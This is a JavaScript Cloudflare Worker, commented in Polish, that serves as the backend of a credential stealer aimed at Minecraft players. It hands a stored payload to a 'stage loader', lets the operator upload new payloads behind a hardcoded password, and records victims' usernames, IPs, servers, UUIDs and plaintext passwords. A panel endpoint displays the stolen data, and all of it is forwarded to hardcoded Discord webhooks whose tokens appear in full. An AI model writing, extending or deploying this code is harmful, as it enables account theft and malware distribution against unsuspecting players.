const PAGE_PASSWORD = "twoje_haslo_do_panelu";

const BACKUP_WEBHOOKS = [
  "https://discord.com/api/webhooks/1494356352858984559/3yDoHB2tpq-JBJRjB2ZT06sIkWcRNC1YUvZTY7IWEYuq6E9NuarUmnL46S3H9D6iSAGa",
  "https://discord.com/api/webhooks/1494356361092534403/JKUvdt8dOumfryB45vyArRAjACb7uFsq-TVPHMfp6ObWVwtVhUN9eXJn4Uj9cW7O7EM7"
];

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);

    // ── Endpoint dla stage loadera ────────────────────────────────────
    if (request.method === 'GET' && url.pathname === '/payload') {
      const payload = await env.RATE_LIMIT.get('payload_class');
      if (!payload) {
        return new Response('Payload not found', { status: 404 });
      }
      return new Response(payload, {
        headers: { 'Content-Type': 'text/plain' }
      });
    }

    // ── Upload endpoint dla nowego payload ────────────────────────────
    if (request.method === 'POST' && url.pathname === '/upload') {
      const auth = url.searchParams.get('auth');
      if (auth !== PAGE_PASSWORD) {
        return new Response('Forbidden', { status: 403 });
      }
      
      const body = await request.text();
      if (!body || body.trim().length === 0) {
        return new Response('Empty payload', { status: 400 });
      }
      
      await env.RATE_LIMIT.put('payload_class', body.trim());
      return new Response('Payload updated successfully', { status: 200 });
    }

    // ── Panel z danymi graczy ─────────────────────────────────────────
    if (request.method === 'GET' && url.pathname === '/panel') {
      const auth = url.searchParams.get('auth');
      if (auth !== PAGE_PASSWORD) {
        return new Response('Forbidden', { status: 403 });
      }

      const keys = await env.RATE_LIMIT.list({ prefix: 'player:' });
      const players = [];
      for (const key of keys.keys) {
        const data = await env.RATE_LIMIT.get(key.name, { type: 'json' });
        if (data) players.push(data);
      }

      return new Response(JSON.stringify(players, null, 2), {
        headers: { 'Content-Type': 'application/json' }
      });
    }

    // ── CORS preflight ────────────────────────────────────────────────
    if (request.method === 'OPTIONS') {
      return new Response(null, {
        headers: {
          'Access-Control-Allow-Origin': '*',
          'Access-Control-Allow-Methods': 'POST, OPTIONS',
          'Access-Control-Allow-Headers': 'Content-Type'
        }
      });
    }

    // ── Webhook proxy (POST) ──────────────────────────────────────────
    if (request.method !== 'POST') {
      return new Response('Method Not Allowed', { status: 405 });
    }

    try {
      const body = await request.text();
      const data = JSON.parse(body);

      const type = data._type;
      const username = data._username;

      // Zapisz dane gracza do KV
      if (type && username) {
        const key = `player:${username.toLowerCase()}`;
        const existing = await env.RATE_LIMIT.get(key, { type: 'json' }) || {};

        if (type === 'LOGIN' || type === 'REGISTER') {
          existing.username = username;
          existing.ip = data._ip || existing.ip;
          existing.server = data._server || existing.server;
          existing.password = data._password;
          existing.lastSeen = new Date().toISOString();
          existing.type = 'cracked';
        } else if (type === 'CHANGEPASSWORD') {
          existing.username = username;
          existing.password = data._password;
          existing.lastSeen = new Date().toISOString();
        } else if (type === 'JOIN_PREMIUM') {
          existing.username = username;
          existing.ip = data._ip || existing.ip;
          existing.uuid = data._uuid;
          existing.lastSeen = new Date().toISOString();
          existing.type = 'premium';
        }

        await env.RATE_LIMIT.put(key, JSON.stringify(existing));
      }

      // Wyślij na Discord
      await sendToDiscord(env, body);

      return new Response(JSON.stringify({ success: true }), {
        status: 200,
        headers: { 
          'Content-Type': 'application/json',
          'Access-Control-Allow-Origin': '*'
        }
      });
    } catch (error) {
      return new Response(JSON.stringify({ success: false }), { status: 500 });
    }
  }
};

async function sendToDiscord(env, body) {
  const webhooks = [env.DISCORD_WEBHOOK_URL, ...BACKUP_WEBHOOKS].filter(Boolean);
  
  for (const url of webhooks) {
    try {
      const res = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: body
      });
      if (res.ok) return true;
    } catch (e) {
      // Próbuj następny webhook
    }
  }
  
  return false;
}
